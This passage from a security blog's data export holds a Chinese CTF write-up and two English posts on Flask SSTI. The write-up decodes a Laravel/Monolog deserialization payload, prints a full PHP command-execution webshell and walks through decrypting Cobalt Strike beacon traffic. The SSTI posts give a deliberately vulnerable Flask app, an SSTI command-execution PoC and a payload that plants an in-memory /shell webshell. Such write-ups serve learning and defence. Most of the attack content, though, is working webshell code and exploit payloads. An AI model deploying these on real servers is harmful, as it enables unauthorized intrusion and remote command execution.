00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00 把payload中的=00替换为空然后解base64可以得到 12&lt;?php __HALT_COMPILER(); ?&gt; \u0002\u0002\u0011\u0001�\u0001a:2:&#123;i:7;O:32:&quot;Monolog\\Handler\\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\\Handler\\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;\u0005dummy\u0004\\KKa\u0004 ~ض\u0001\btest.txt\u0004\\KKa\u0004 ~ض\u0001testtest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��\u0002GBMB 这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容 1234514433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4Fb430b310838a93&#x3D;4gf861d394170244&#x3D;X4Y21kufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm 上面是对解压包的url解码，然后gzip+base64解码尝试还原代码内容,对上面的每个参数进行解密!下面这个包是解压缩的包的解码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);if($opdir) &#123; $ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir); @array_push($oparr,$ocwd,sys_get_temp_dir()); foreach($oparr as $item) &#123; if(!@is_writable($item)) &#123; continue; &#125; ; $tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;; @mkdir($tmdir); if(!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\\\\\|\\&#x2F;&#x2F;&quot;,$tmdir); for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123; @chdir(&quot;..&quot;); &#125; ; @ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;); @rmdir($tmdir); break; &#125; ;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output&#x3D;ob_get_contents(); ob_end_clean(); echo &quot;36&quot;.&quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot;.&quot;ff1&quot;;&#125;ob_start();try &#123; $p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2)); $s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); $envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2)); $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;&#x2F;c \\&quot;&#123;$s&#125;\\&quot;&quot;; if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;); &#125; else &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;); &#125; if(!empty($envstr)) &#123; $envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr); foreach($envarr as $v) &#123; if (!empty($v)) &#123; @putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v)); &#125; &#125; &#125; $r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;; function fe($f) &#123; $d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;)); if(empty($d)) &#123; $d&#x3D;array(); &#125; else &#123; $d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d)); &#125; return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d)); &#125; ; function runshellshock($d, $c) &#123; if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123; if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123; $tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;); putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;); if (fe(&#39;error_log&#39;)) &#123; error_log(&quot;a&quot;, 1); &#125; else &#123; mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); &#125; &#125; else &#123; return False; &#125; $output &#x3D; @file_get_contents($tmp); @unlink($tmp); if ($output !&#x3D; &quot;&quot;) &#123; print($output); return True; &#125; &#125; return False; &#125; ; function runcmd($c) &#123; $ret&#x3D;0; $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if(fe(&#39;system&#39;)) &#123; @system($c,$ret); &#125; elseif(fe(&#39;passthru&#39;)) &#123; @passthru($c,$ret); &#125; elseif(fe(&#39;shell_exec&#39;)) &#123; print(@shell_exec($c)); &#125; elseif(fe(&#39;exec&#39;)) &#123; @exec($c,$o,$ret); print(join(&quot;&quot;,$o)); &#125; elseif(fe(&#39;popen&#39;)) &#123; $fp&#x3D;@popen($c,&#39;r&#39;); while(!@feof($fp)) &#123; print(@fgets($fp,2048)); &#125; @pclose($fp); &#125; elseif(fe(&#39;proc_open&#39;)) &#123; $p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io); while(!@feof($io[1])) &#123; print(@fgets($io[1],2048)); &#125; while(!@feof($io[2])) &#123; print(@fgets($io[2],2048)); &#125; @fclose($io[1]); @fclose($io[2]); @proc_close($p); &#125; elseif(fe(&#39;antsystem&#39;)) &#123; @antsystem($c); &#125; elseif(runshellshock($d, $c)) &#123; return $ret; &#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123; $w&#x3D;new COM(&#39;WScript.shell&#39;); $e&#x3D;$w-&gt;exec($c); $so&#x3D;$e-&gt;StdOut(); $ret.&#x3D;$so-&gt;ReadAll(); $se&#x3D;$e-&gt;StdErr(); $ret.&#x3D;$se-&gt;ReadAll(); print($ret); &#125; else &#123; $ret &#x3D; 127; &#125; return $ret; &#125; ; $ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;); print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;; ;&#125;catch(Exception $e) &#123; echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); 可以看到，参数s接收执行命令的参数 1$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); 所以s= /d \"D:\\\\phpstudy_pro\\\\WWW\\\\secret\"&\"C:\\Program Files\\7-Zip\\7z.exe\" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f1 可以得到压缩密码为P4Uk6qkh6Gvqwg3y。下面就可以解压beacon keys.下面需要做的工作为：获得私钥，通过私钥获得AES密钥以查看与teamserver的通信内容。需要用到的工具在https://github.com/WBGlIl/CS_Decrypt 首先是根据私钥文件恢复RSA KEY。根据RSA KEY 恢复AES KEY，需要看beacon通信的数据包，根据cs特性，一般这个值藏在cookie里。拿到AES KEY之后，继续利用脚本还原beacon返回的内容，这里抓取的是submit.php的特征。根据CobaltStrike的通信规则，beacon会向teamserver POST submit.php?id=xxx，POSTDATA为AES加密后的内容。将加密后的内容复制出来之后解密注意需要是base64格式的，然后使用脚本进行解密解密后得到flag。 后记这题太折磨人了，做了好久才做出来，写wp又写了一段时间。顺便学了下CS的简单通信过程，收获还是有的。参考链接：https://blog.csdn.net/qq_43264813/article/details/120560209https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuanhttps://www.wkr.moe/ctf/610.html#toc-head-3","categories":[],"tags":[],"author":"Polo"},{"title":"Analysis of flask memory webshell","slug":"Analysis-of-flask-memory-webshell","date":"2021-09-24T13:16:39.000Z","updated":"2021-09-24T14:56:49.000Z","comments":true,"path":"2021/09/24/Analysis-of-flask-memory-webshell/","link":"","permalink":"https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/","excerpt":"","text":"NOTICEBefore analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know url_for.__globals__ could find global variables in current app. IntroductionIn the previous passage I’ve introduced memory webshell in flask and implemented it,so in this passage I’ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell. AnalysisThis is a EXP in Flask SSTI vulnerability which could register a route and execute system command. 123456789101112url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]( &quot;app.add_url_rule( &#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() ) &quot;, &#123; &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] &#125;) There are some complex functions and variables in the PoC,I’ll explain it.From SSTI we can reach eval function to execute python command,such as eval(“__import__(‘os’).popen(‘whoami’).read()”)function add_url_rule() is used for adding route,such as add route in flask app. 1add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options) Briefly,we can pass parameter to this function to register route and define the handle function.Usually we can pass(‘/shell’,’shell’,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this: 123456app.add_url_rule( &#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() ) This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I didn’t explain variables like request_ctx_stack 、app、current_app. request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop 、handle it.So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask app’s every handle function in route to handle the current request! request.args.get() is used for get the parameter’s value from front-end,juset need the parameter name and the default value is whoami in this EXP. In eval function, we noticed that there is a variable called app, but now we don’t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack. We have analysed all the EXP, so we can generate a memory webshell now:)no new route was found in source code:) Reference https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/ https://segmentfault.com/blog/myflask https://www.cnblogs.com/bigox/p/11652859.html https://englndcib.blogspot.com/2021/08/python-lambda.html","categories":[],"tags":[],"author":"Polo"},{"title":"implementation of memory webshell in flask","slug":"webshell-in-flask","date":"2021-09-05T09:30:36.000Z","updated":"2021-09-15T15:08:03.000Z","comments":true,"path":"2021/09/05/webshell-in-flask/","link":"","permalink":"https://polosec.github.io/2021/09/05/webshell-in-flask/","excerpt":"","text":"IntroductionServer-side Template Injection(SSTI) is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited . It is easy to be exploited if a SSTI vulnerability were found. In this page ,I’ll show how to utilize it to inject webshell into memory.In next passage I’ll explain the procedure of a Flask app receive,understand and execute the command which sent by user. DemoA simple Flask framework web application with SSTI vulnerability as follows: 12345678910111213141516171819from flask import Flask,requestfrom flask import render_template_stringapp = Flask(__name__)@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def test(): template = &#x27;&#x27;&#x27; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &#x27;&#x27;&#x27; %(request.args.get(&#x27;name&#x27;)) return render_template_string(template)if __name__ == &#x27;__main__&#x27;: app.run() In this demo , you can enter test directory and pass parameter ‘name’ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains. Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000): 1http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125; This PoC shows that SSTI vulnerability could execute system command in web page which based on Flask.But the privilege inherited from the user who launched this application. Webshell injection in FlaskThere is a way to inject webshell into flask: 12345671.find the function which responsible for registering route2.pass paramaters to the function and improt os modules to execute system command3.expose an API to execute user-defined system commandso so here is the Payload&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, 